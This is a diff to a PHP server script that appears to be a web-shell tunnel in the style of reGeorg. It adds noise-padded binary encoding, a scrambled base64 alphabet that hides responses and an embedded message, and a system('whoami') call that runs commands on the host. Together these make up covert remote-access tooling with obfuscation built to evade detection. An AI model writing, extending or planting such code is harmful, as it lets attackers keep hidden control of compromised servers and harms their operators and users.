@@ -17,9 +17,49 @@ define('END_INDEX', 0);
 // HTTP response code Handling : send arbitrary code as response
 if(version_compare(PHP_VERSION,'5.4.0','>='))@http_response_code(200);
 
+// decode binary to string
+function blv_decode($data) {
+    $data_len = strlen($data);
+    $info = array();
+    $i = 0;
+    while ( $i < $data_len) {
+        $d = unpack("c1b/N1l", substr($data, $i, 5));
+        $b = $d['b'];
+        $l = $d['l'] - BLV_L_OFFSET;
+        $i += 5;
+        $v = substr($data, $i, $l);
+        $i += $l;
+        $info[$b] = $v;
+    }
     return $info;
 }
 
+
+//encode string to binary format
+
+function blv_encode($info) {
+    $data = "";
+    $info[0] = randstr();
+    $info[39] = randstr();
+
+    foreach($info as $b => $v) {
+        $l = strlen($v) + BLV_L_OFFSET;
+        $data .= pack("c1N1", $b, $l);
+        $data .= $v;
+    }
+    return $data;
+}
+
+
+// generate random string for noise
+function randstr() {
+    $rand = '';
+    $length = mt_rand(5, 20);
+    for ($i = 0; $i < $length; $i++) {
+        $rand .= chr(mt_rand(0, 255));
+    }
+    return $rand;
+}
 
 // indexes of info array to store input 
 $DATA          = 1;
@@ -32,6 +72,8 @@ $PORT          = 7;
 $REDIRECTURL   = 8;
 $FORCEREDIRECT = 9;
 
+$en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+$de = "4brZlX06y+SFgxhVsuM2twHP8BAq7C1a5IjLDU9finKWGEpRezYmdJ/cv3OkNQoT";
 
 
 //extracting input 
@@ -200,8 +242,10 @@ switch($cmd){
     }
 }
 if ( $sayhello ) {
+    echo base64_decode(strtr("VrlEFMb0McIu2PxMMHdcBHut2DBg2lg/7dwl7DIdg9ns7f+
+BuHzv1L+t2cIlB9yJqfwfgZBh16uPCd8vq9zMqmxttDB0yrdEV5==", $de, $en));
 echo "euuuhhhhhhhh \n";
+system("whoami");
 } else {
-    echo json_encode($rinfo);
+    echo strtr(base64_encode(blv_encode($rinfo)), $en, $de);
 }
-?>
